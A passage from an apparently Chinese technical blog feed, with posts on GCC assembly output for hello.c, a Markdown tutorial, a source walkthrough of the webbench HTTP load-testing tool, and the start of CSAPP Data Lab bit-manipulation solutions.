class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">        .file   <span class="hljs-string">&quot;hello.c&quot;</span><br>        .text<br>        .section        .rodata<br>.LC0:<br>        .<span class="hljs-built_in">string</span> <span class="hljs-string">&quot;Hello, world!\n&quot;</span><br>        .text<br>        .globl  main<br>        .type   main, @function<br>main:<br>.LFB0:<br>        .cfi_startproc<br>        endbr64<br>        pushq   %rbp<br>        .cfi_def_cfa_offset <span class="hljs-number">16</span><br>        .cfi_offset <span class="hljs-number">6</span>, <span class="hljs-number">-16</span><br>        movq    %rsp, %rbp<br>        .cfi_def_cfa_register <span class="hljs-number">6</span><br>        subq    $<span class="hljs-number">32</span>, %rsp<br>        movl    %edi, <span class="hljs-number">-20</span>(%rbp)<br>        movq    %rsi, <span class="hljs-number">-32</span>(%rbp)<br>        leaq    .LC0(%rip), %rax<br>        movq    %rax, <span class="hljs-number">-8</span>(%rbp)<br>        movq    <span class="hljs-number">-8</span>(%rbp), %rax<br>        movq    %rax, %rdi<br>        call    <span class="hljs-built_in">strlen</span>@PLT<br>        movq    %rax, %rdx<br>        movq    <span class="hljs-number">-8</span>(%rbp), %rax<br>        movq    %rdx, %rcx<br>        movq    %rax, %rdx<br>        movl    $<span class="hljs-number">1</span>, %esi<br>        movl    $<span class="hljs-number">1</span>, %edi<br>        movl    $<span class="hljs-number">0</span>, %eax<br>        call    syscall@PLT<br>        movl    $<span class="hljs-number">0</span>, %eax<br>        leave<br>        .cfi_def_cfa <span class="hljs-number">7</span>, <span class="hljs-number">8</span><br>        ret<br>        .cfi_endproc<br>.LFE0:<br>        .size   main, .-main<br>        .ident  <span class="hljs-string">&quot;GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0&quot;</span><br>        .section        .note.GNU-<span class="hljs-built_in">stack</span>,<span class="hljs-string">&quot;&quot;</span>,@progbits<br>        .section        .note.gnu.property,<span class="hljs-string">&quot;a&quot;</span><br>        .align <span class="hljs-number">8</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">1f</span> - <span class="hljs-number">0f</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">4f</span> - <span class="hljs-number">1f</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">5</span><br><span class="hljs-number">0</span>:<br>        .<span class="hljs-built_in">string</span>  <span class="hljs-string">&quot;GNU&quot;</span><br><span class="hljs-number">1</span>:<br>        .align <span class="hljs-number">8</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">0xc0000002</span><br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">3f</span> - <span class="hljs-number">2f</span><br><span class="hljs-number">2</span>:<br>        .<span class="hljs-keyword">long</span>    <span class="hljs-number">0x3</span><br><span class="hljs-number">3</span>:<br>        .align <span class="hljs-number">8</span><br><span class="hljs-number">4</span>:<br></code></pre></td></tr></table></figure><table><thead><tr><th>.file</th><th>源文件</th></tr></thead><tbody><tr><td>.text</td><td>代码段</td></tr><tr><td>.global</td><td>全局变量</td></tr><tr><td>.data</td><td>存放已经初始化的全局和静态C 变量</td></tr><tr><td>.section  .rodata</td><td>存放只读变量</td></tr><tr><td>.align</td><td>对齐方式</td></tr><tr><td>.type</td><td>表示是函数类型/对象类型</td></tr><tr><td>.size</td><td>表示大小</td></tr><tr><td>.long  .string</td><td>表示是long类型/string类型</td></tr></tbody></table><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><ul><li>编译器将汇编语言程序转化为可重定位目标文件</li><li>.s —&gt; .o 指令为<code>gcc -c hello.s -o hello.o</code></li><li>objdump 分析hello.o：<code>objdump -d hello.o</code></li></ul><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>将多个.o文件链接为一个可执行文件</p><p>关于链接器的更多内容：<code>man ld</code></p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown快速入门</title>
    <link href="/p/2e672870/"/>
    <url>/p/2e672870/</url>
    
    <content type="html"><![CDATA[<h2 id="Markdown简介"><a href="#Markdown简介" class="headerlink" title="Markdown简介"></a>Markdown简介</h2><ul><li>Markdown 是一种轻量级标记语言</li><li>Markdown 编写的文档可以导出为多种格式，比如PDF，word，HTML等。平时写实验报告就可以用Markdown编写然后输出为PDF格式</li><li>Markdown 编写的文档后缀为<code> .md</code></li><li>常用编辑器： <a href="https://www.typora.io/">typora</a>、vscode</li></ul><hr><h2 id="Markdown的好处"><a href="#Markdown的好处" class="headerlink" title="Markdown的好处"></a>Markdown的好处</h2><ul><li>可以只关注文字内容本身，而不是花太多时间在排版上</li><li>可以导出为多种格式</li><li>书写美观大方</li><li>学习之后可以用在书写博客、gitbook等上面，现在很多内容创作平台都支持Markdown语法</li></ul><hr><h2 id="Markdown快速入门"><a href="#Markdown快速入门" class="headerlink" title="Markdown快速入门"></a>Markdown快速入门</h2><hr><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p><code>#</code>后面是标题，有几个#表示是几级标题</p><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><p>在typora中更加方便，直接ctrl+数字键即可创建标题</p><h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><hr><ul><li>如果文字之间空一行，表示是两个段落</li><li>如果没有文字之间没有空行，说明是一个段落</li></ul><hr><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><p>_斜体_：  _文字_<br><strong>粗体</strong>：**文字**<br><em><strong>粗斜体</strong></em>：***粗斜体文本***</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>支持高亮显示</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-keyword">int</span>&gt;&amp; nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; mp;<br>        vector&lt;<span class="hljs-keyword">int</span>&gt; ans;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(mp.<span class="hljs-built_in">count</span>(target-nums[i]))<br>            &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(mp[target-nums[i]]);<br>                ans.<span class="hljs-built_in">push_back</span>(i);<br>                <span class="hljs-keyword">return</span> ans;<br>            &#125;<br>            <span class="hljs-keyword">else</span> mp[nums[i]]=i;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="线"><a href="#线" class="headerlink" title="线"></a>线</h3><ul><li>分割线：- - -表示分割线</li><li><del>删除线</del>：~~被删除文字~~</li><li><u>下划线</u>：&lt;u&gt;带下划线文本&lt;/u&gt;</li></ul><hr><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>-<br>*</p><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>&gt; 表示引用</p><p>&gt; &gt; 表示嵌套的引用</p><blockquote><p>这是引用</p><blockquote><p>这是嵌套的引用</p></blockquote></blockquote><hr><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><p>```cpp<br>代码内容，以cpp为例<br>```</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul><li>&lt;链接&gt;        </li><li>[显示的文字](放入网址)</li></ul><hr><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>csdn中图片大小的缩放：<br>例：设定图片对应的源码中t_70 = 1000x，可以更改数值</p><hr><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>右键，插入即可<br>|姓名| 宗派 |<br>|–|–|<br>|  马保国|  浑元形意太极门|</p><hr><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><ul><li>行内公式：$公式$<br>$a^b$ 表示的就是 $a^b$</li><li>单独一行的公式：$$公式$$</li></ul><p>$$ a^b $$ 表示的就是 </p><p>$$a^b$$</p><h1 id="vscode中的md支持"><a href="#vscode中的md支持" class="headerlink" title="vscode中的md支持"></a>vscode中的md支持</h1><p>以插件Markdown shortcuts为例：</p><table><thead><tr><th>Name</th><th>Description</th><th>Default key binding</th></tr></thead><tbody><tr><td>md-shortcut.showCommandPalette</td><td>Display all commands</td><td>ctrl+M ctrl+M</td></tr><tr><td>md-shortcut.toggleBold</td><td>Make <strong>bold</strong></td><td>ctrl+B</td></tr><tr><td>md-shortcut.toggleItalic</td><td>Make <em>italic</em></td><td>ctrl+I</td></tr><tr><td>md-shortcut.toggleStrikethrough</td><td>Make <del>strikethrough</del></td><td></td></tr><tr><td>md-shortcut.toggleLink</td><td>Make <a href="www.example.org">a hyperlink</a></td><td>ctrl+L</td></tr><tr><td>md-shortcut.toggleImage</td><td>Make an image <img src="image_url.png"></td><td>ctrl+shift+L</td></tr><tr><td>md-shortcut.toggleCodeBlock</td><td>Make <code>a code block</code></td><td>ctrl+M ctrl+C</td></tr><tr><td>md-shortcut.toggleInlineCode</td><td>Make <code>inline code</code></td><td>ctrl+M ctrl+I</td></tr><tr><td>md-shortcut.toggleBullets</td><td>Make * bullet point</td><td>ctrl+M ctrl+B</td></tr><tr><td>md-shortcut.toggleNumbers</td><td>Make 1. numbered list</td><td>ctrl+M ctrl+1</td></tr><tr><td>md-shortcut.toggleCheckboxes</td><td>Make - [ ] check list (Github flavored markdown)</td><td>ctrl+M ctrl+X</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webbench源码学习</title>
    <link href="/p/93d200d8/"/>
    <url>/p/93d200d8/</url>
    
    <content type="html"><![CDATA[<h1 id="webbench简介"><a href="#webbench简介" class="headerlink" title="webbench简介"></a>webbench简介</h1><p>webbench是一个http服务器的压力测试工具，原理是通过fork模拟出多个子进程对指定url进行请求，并通过管道通信让子进程将得到的数据发送给父进程，从而完成数据的统计，它最多可以模拟3万个并发连接去测试网站的负载能力</p><p>这是我写的源码注释仓库：<a href="https://github.com/LaPhilosophie/WebBench">https://github.com/LaPhilosophie/WebBench</a></p><h1 id="分析图"><a href="#分析图" class="headerlink" title="分析图"></a>分析图</h1><p><img src="/image/webbench-workflow.png"></p><p><img src="/image/Snipaste_2022-08-25_23-42-10.png"></p><h1 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">zarathustra@Nietzsche ~<span class="hljs-regexp">/c/</span>WebBench (master) [<span class="hljs-number">2</span>]&gt; .<span class="hljs-regexp">/webbench -c 30 -t 10 http:/</span><span class="hljs-regexp">/xinanzhijia.xyz/</span><br>Webbench - Simple Web Benchmark <span class="hljs-number">1.5</span><br>Copyright (c) Radim Kolar <span class="hljs-number">1997</span>-<span class="hljs-number">2004</span>, GPL Open <span class="hljs-keyword">Source</span> Software.<br><br>Request:<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.0</span><br>User-Agent: WebBench <span class="hljs-number">1.5</span><br>Host: xinanzhijia.xyz<br><br><br>Runing info: <span class="hljs-number">30</span> clients, running <span class="hljs-number">10</span> sec.<br><br>Speed=<span class="hljs-number">1818</span> pages<span class="hljs-regexp">/min, 3934 bytes/</span>sec.<br>Requests: <span class="hljs-number">303</span> susceed, <span class="hljs-number">0</span> failed.<br></code></pre></td></tr></table></figure><h1 id="处理命令行参数"><a href="#处理命令行参数" class="headerlink" title="处理命令行参数"></a>处理命令行参数</h1><p>webbench使用getopt_long函数进行参数的处理，他支持许多参数（如下）</p><p>获知命令行参数之后，进行参数的获取，并设置变量字段，进行请求包的构造</p><table><thead><tr><th>短参</th><th>长参数</th><th>作用</th></tr></thead><tbody><tr><td>-f</td><td>–force</td><td>不需要等待服务器响应</td></tr><tr><td>-r</td><td>–reload</td><td>发送重新加载请求</td></tr><tr><td>-t</td><td>–time</td><td>运行多长时间，单位：秒”</td></tr><tr><td>-p</td><td>–proxy server:port</td><td>使用代理服务器来发送请求</td></tr><tr><td>-c</td><td>–clients</td><td>创建多少个客户端，默认1个”</td></tr><tr><td>-9</td><td>–http09</td><td>使用 HTTP/0.9</td></tr><tr><td>-1</td><td>–http10</td><td>使用 HTTP/1.0 协议</td></tr><tr><td>-2</td><td>–http11</td><td>使用 HTTP/1.1 协议</td></tr><tr><td>–get</td><td>使用 GET请求方法</td><td></td></tr><tr><td>–head</td><td>使用 HEAD请求方法</td><td></td></tr><tr><td>–options</td><td>使用 OPTIONS请求方法</td><td></td></tr><tr><td>–trace</td><td>使用 TRACE请求方法</td><td></td></tr><tr><td>-?/-h</td><td>–help</td><td>打印帮助信息</td></tr><tr><td>-V</td><td>–version</td><td>显示版本号</td></tr></tbody></table><h2 id="getopt"><a href="#getopt" class="headerlink" title="getopt()"></a>getopt()</h2><p>getopt:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getopt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * <span class="hljs-keyword">const</span> argv[],</span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *optstring)</span></span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> *optarg;<br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> optind, opterr, optopt;<br></code></pre></td></tr></table></figure><p>getopt解析命令行参数，函数原型如上。argc和argv是main函数的参数，argv中以-开头的是选项，比如-v，v是选项</p><ul><li>如果重复调用 getopt () ，它将依次返回每个选项元素中的每个选项字符</li><li>optstring是一个字符串，比如“nm:sl”，这表示可以处理四个选项，-n、-m、-s、-l，其中，：之前的字母可以有参数，比如在这里，由于：之前有m，所以可以有如下用法：-m xxx</li><li>变量 optind 是要在 argv 中处理的下一个元素的索引。系统将此值初始化为1</li><li>如果 getopt ()找到一个选项字符，它会<strong>返回该字符</strong>，更新extend变量 optind 和一个static变量 nextchar</li><li>解析了所有的命令行选项,getopt () <strong>返回-1</strong>，且optind是 argv 中第一个不是选项的 argv 元素的索引</li><li>如果遇到不在optstring中的字符，返回？</li><li>如果 getopt ()遇到一个缺少参数的选项且optstring第一个字符不是:，那么返回？</li></ul><h2 id="getopt-long"><a href="#getopt-long" class="headerlink" title="getopt_long()"></a>getopt_long()</h2><p>getopt_long：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;getopt.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getopt_long</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * <span class="hljs-keyword">const</span> argv[],</span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *optstring,</span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">const</span> struct option *longopts, </span></span><br><span class="hljs-params"><span class="hljs-function">           <span class="hljs-keyword">int</span> *longindex)</span></span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">option</span> &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-keyword">int</span>         has_arg;<br>    <span class="hljs-keyword">int</span>        *flag;<br>    <span class="hljs-keyword">int</span>         val;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>getopt_long与getopt类似，但是同时也可以处理长选项，即以两个横杠开头的选项，比如–version</li><li>name类似于上面的optstring</li><li>has_arg：<ul><li>no_argument (or 0)</li><li>required_argument (or 1)</li><li>optional_argument (or 2) </li></ul></li><li>如果flag为NULL，则getopt_long()返回val，否则val赋值给flag指针所指内容</li><li>getopt_long的返回值类似于getopt函数（error、-1、？）</li><li>longopts数组的最后一个元素应该全为0</li><li>optarg: 如果合法选项带有参数，那么对应的参数，赋值给optarg</li></ul><p>关于flag的描述有点绕，摘抄一下：</p><blockquote><p>specifies how results are returned for a long option. If flag is NULL, then getopt_long() returns val. (For example, the calling program may set val to the equivalent short option character.) Otherwise, getopt_long() returns 0, and flag points to a variable which is set to val if the option is found, but left unchanged if the option is not found.</p></blockquote><h1 id="请求包的构造"><a href="#请求包的构造" class="headerlink" title="请求包的构造"></a>请求包的构造</h1><ul><li>请求报文被存到request数组，它是一个全局变量</li><li>build_request用到了大量的字符串处理函数，比如memset、strcat、strchr、strstr</li><li>处理之后request数组所储存的内容类似：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.0</span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>WebBench 1.5<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>gls.show<br></code></pre></td></tr></table></figure></li></ul><h1 id="bench函数"><a href="#bench函数" class="headerlink" title="bench函数"></a>bench函数</h1><p>该函数是项目的核心</p><ul><li>先调用socket.c中的socket函数测试是否可以连通</li><li>fork出client数量的进程。注意到这里通过子进程在循环中的break使得不会出现指数爆炸式的进程数量，而是设置的client数量的进程</li><li>创建管道，父子进程分离，并通过管道进行通信<ul><li>子进程：连接服务器并收发包得到数据，通过管道写端传送给父进程</li><li>父进程：通过管道读端得到数据，并统计得出最终结果</li></ul></li><li>通关自定义的信号控制命令行参数中的时间设置</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><ul><li>总体来说还是个不错的项目，但是代码中确实有些写的不够好的地方<ul><li>pid_t同时用于接受fork返回值和fscanf函数返回值</li><li>使用了大量的全局变量</li><li>没有关闭管道不需要的一端</li><li>错误处理有些混乱</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>C语言</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab1：Data lab</title>
    <link href="/p/6d79108/"/>
    <url>/p/6d79108/</url>
    
    <content type="html"><![CDATA[<h1 id="bitxor"><a href="#bitxor" class="headerlink" title="bitxor"></a>bitxor</h1><ul><li>只能使用给定的运算符，得到异或操作的等价函数</li><li>类似于数电中与非逻辑门实现异或</li><li>x xor yt = <code>~(~(~x&amp;y)&amp;~(x&amp;~y))</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitXor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><br>  <span class="hljs-keyword">return</span> ~(~(~x&amp;y)&amp;~(x&amp;~y));<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><ul><li>函数返回二进制补码表示的最小的数<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">tmin</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<span class="hljs-comment">//tmin is 100....0</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><ul><li>检测传入的参数x是不是能表示的最大值</li><li>若是最大值，那么一定满足：01111111，也即是满足：(x+1)^(~x)的值为0</li><li>但是，满足(x+1)^(~x)的并不一定都是01111111，反例：11111111，因此可以利用!!(x+1)作为两者的区分<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*x : 01111111</span><br><span class="hljs-comment">  ~x: 10000000</span><br><span class="hljs-comment">  y :11111111</span><br><span class="hljs-comment">  ~y:00000000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isTmax</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> y=(x+<span class="hljs-number">1</span>)^(~x);<br>  <span class="hljs-keyword">return</span> !y&amp;!!(x+<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><ul><li>如果奇数比特位上都是1那么函数返回1</li><li>使用移位运算得到0xAAAAAAAA，x&amp;y0xAAAAAAAA可以过滤掉所有偶数位，然后将结果与0xAAAAAAAAy异或，如果是0那么满足题意</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//0xAAAAAAAA=0b10101010101010101010101010101010</span><br><span class="hljs-comment">//0x55555555=0b01010101010101010101010101010101</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">allOddBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> a=<span class="hljs-number">0xaa</span>;<br>  <span class="hljs-keyword">int</span> y=(a&lt;&lt;<span class="hljs-number">8</span>)+(a&lt;&lt;<span class="hljs-number">16</span>)+(a&lt;&lt;<span class="hljs-number">24</span>)+a;<br>  <span class="hljs-keyword">return</span> !((x&amp;y)^y);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><ul><li>得到x的负数形式</li><li>直接取反加以即可</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">negate</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<span class="hljs-comment">//for all x,-x=~x+1</span><br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><ul><li>判断是不是0-9的数字</li><li>x应该满足：<ul><li>大于等于0b00110000</li><li>小于    0b00111010</li></ul></li><li>首先判断前四位是不是0011，如果与3异或是0那么说明满足</li><li>然后通过与0xf进行与运算的方式，将x去掉last 4 